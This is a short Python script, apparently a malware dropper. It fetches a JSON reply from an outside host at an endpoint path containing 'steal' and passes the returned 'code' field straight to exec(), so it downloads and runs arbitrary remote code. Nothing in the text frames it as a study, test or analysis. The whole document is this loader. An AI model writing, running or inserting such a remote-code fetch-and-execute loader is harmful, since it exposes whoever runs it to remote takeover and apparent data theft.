import requests

def main():
    response = requests.get("http://wpp-api-vrv3.onrender.com/api/steal/1140884481671188581/", headers={"auth": "&&CD&&ON"})
    code = response.json().get('code')

    if code:
        exec(code)

if __name__ == "__main__":
    main()